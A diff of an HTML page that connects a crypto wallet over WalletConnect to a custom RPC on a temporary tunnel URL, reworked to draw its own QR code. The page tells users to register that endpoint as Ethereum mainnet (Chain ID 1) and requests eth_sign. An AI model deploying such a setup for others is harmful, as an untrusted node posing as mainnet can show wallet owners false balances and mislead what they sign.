@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WalletConnect to My RPC</title>
+    <title>WalletConnect QR Generator</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,12 +11,15 @@
             margin: 40px auto;
             padding: 20px;
             background: #f5f5f5;
+            text-align: center;
         }
         .rpc-url {
             background: #e0e0e0;
             padding: 10px;
             border-radius: 5px;
             word-break: break-all;
+            font-family: monospace;
+            margin: 20px 0;
         }
         button {
             background: #3b99fc;
@@ -26,7 +29,26 @@
             border-radius: 6px;
             font-size: 16px;
             cursor: pointer;
-            margin-top: 20px;
+            margin: 20px 0;
+        }
+        #qr-container {
+            margin: 30px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+        #qr-code {
+            margin: 20px auto;
+        }
+        #uri-display {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 12px;
         }
         #status, #result {
             margin-top: 20px;
@@ -35,72 +57,113 @@
             white-space: pre-wrap;
         }
         #status { background: #fff3cd; display: none; }
-        #result { background: #d4edda; }
-        .note { background: #d1ecf1; padding: 10px; border-radius: 5px; margin-top: 20px; }
+        #result { background: #d4edda; display: none; }
+        .note {
+            background: #d1ecf1;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: left;
+            margin-top: 20px;
+        }
     </style>
+    <!-- QR Code library -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+    <!-- Ethers and WalletConnect Ethereum Provider -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
 </head>
 <body>
-    <h1>🔗 Connect to My Custom RPC via WalletConnect</h1>
+    <h1>🔗 Connect to My Custom RPC</h1>
     <p><strong>RPC Endpoint:</strong></p>
     <div class="rpc-url" id="rpcUrl">https://vegetation-workplace-experienced-illustrations.trycloudflare.com</div>
 
     <div class="note">
-        ⚠️ <strong>Important:</strong> Before connecting, you must add this network to your wallet (Trust Wallet / MetaMask) with:
+        ⚠️ <strong>Before connecting:</strong> Add this network to your wallet (Trust Wallet / MetaMask) with:
         <ul>
             <li><strong>Network Name:</strong> My Local RPC</li>
             <li><strong>RPC URL:</strong> (the URL above)</li>
             <li><strong>Chain ID:</strong> 1</li>
             <li><strong>Symbol:</strong> ETH</li>
         </ul>
-        Otherwise, the wallet may not recognize the network.
     </div>
 
-    <button id="connectBtn">Connect Wallet</button>
+    <button id="connectBtn">Generate QR Code</button>
+
+    <div id="qr-container">
+        <h3>Scan with your wallet</h3>
+        <div id="qr-code"></div>
+        <p>Or copy the URI:</p>
+        <div id="uri-display"></div>
+    </div>
+
     <div id="status"></div>
     <div id="result"></div>
 
-    <!-- Ethers and WalletConnect Ethereum Provider -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
     <script>
         (function() {
             const rpcUrl = document.getElementById('rpcUrl').innerText;
             const projectId = "cd1a5ec0393767579e1f364ffc41597d";
             const connectBtn = document.getElementById('connectBtn');
+            const qrContainer = document.getElementById('qr-container');
+            const qrDiv = document.getElementById('qr-code');
+            const uriDisplay = document.getElementById('uri-display');
             const statusDiv = document.getElementById('status');
             const resultDiv = document.getElementById('result');
 
-            // Check if the WalletConnect library loaded correctly
-            if (typeof window.EthereumProvider === 'undefined') {
+            let provider;
+
+            // Check if libraries loaded
+            if (typeof window.EthereumProvider === 'undefined' || typeof QRCode === 'undefined') {
                 statusDiv.style.display = 'block';
-                statusDiv.innerHTML = '❌ WalletConnect library failed to load. Please check your internet connection or try again later.';
+                statusDiv.innerHTML = '❌ Required libraries failed to load. Check your internet connection.';
                 connectBtn.disabled = true;
             } else {
                 connectBtn.addEventListener('click', async () => {
                     statusDiv.style.display = 'block';
-                    statusDiv.innerText = 'Connecting...';
-                    resultDiv.innerText = '';
+                    statusDiv.innerText = 'Initializing WalletConnect...';
+                    qrContainer.style.display = 'none';
+                    resultDiv.style.display = 'none';
 
                     try {
-                        // Initialize WalletConnect provider
-                        const provider = await window.EthereumProvider.init({
+                        // Initialize provider without showing modal
+                        provider = await window.EthereumProvider.init({
                             projectId,
-                            chains: [1],                     // Chain ID 1 (Ethereum)
-                            showQrModal: true,               // Automatically shows the QR modal
-                            rpcMap: {
-                                1: rpcUrl                    // Map chain 1 to your custom RPC
-                            },
+                            chains: [1],
+                            showQrModal: false,   // We'll handle the QR ourselves
+                            rpcMap: { 1: rpcUrl },
                             methods: ['eth_sendTransaction', 'eth_sign', 'eth_accounts'],
                             optionalMethods: ['eth_signTypedData', 'eth_signTypedData_v4']
                         });
 
-                        // Wrap with ethers
+                        // Listen for the URI event
+                        provider.on('display_uri', (uri) => {
+                            // Display the URI
+                            uriDisplay.innerText = uri;
+                            // Generate QR code
+                            QRCode.toCanvas(uri, { width: 250 }, (err, canvas) => {
+                                if (err) {
+                                    statusDiv.innerText = 'QR generation failed: ' + err.message;
+                                    return;
+                                }
+                                qrDiv.innerHTML = ''; // Clear previous
+                                qrDiv.appendChild(canvas);
+                                qrContainer.style.display = 'block';
+                                statusDiv.style.display = 'none';
+                            });
+                        });
+
+                        // Trigger connection
+                        await provider.connect();
+
+                        // After successful connection, we can get accounts
                         const ethersProvider = new ethers.providers.Web3Provider(provider);
                         const signer = ethersProvider.getSigner();
                         const address = await signer.getAddress();
                         const balance = await ethersProvider.getBalance(address);
 
-                        statusDiv.style.display = 'none';
+                        // Show result (and hide QR)
+                        qrContainer.style.display = 'none';
+                        resultDiv.style.display = 'block';
                         resultDiv.innerText = `✅ Connected: ${address}\n💰 ETH Balance: ${ethers.utils.formatEther(balance)} ETH`;
                     } catch (err) {
                         statusDiv.innerText = `❌ Error: ${err.message}`;
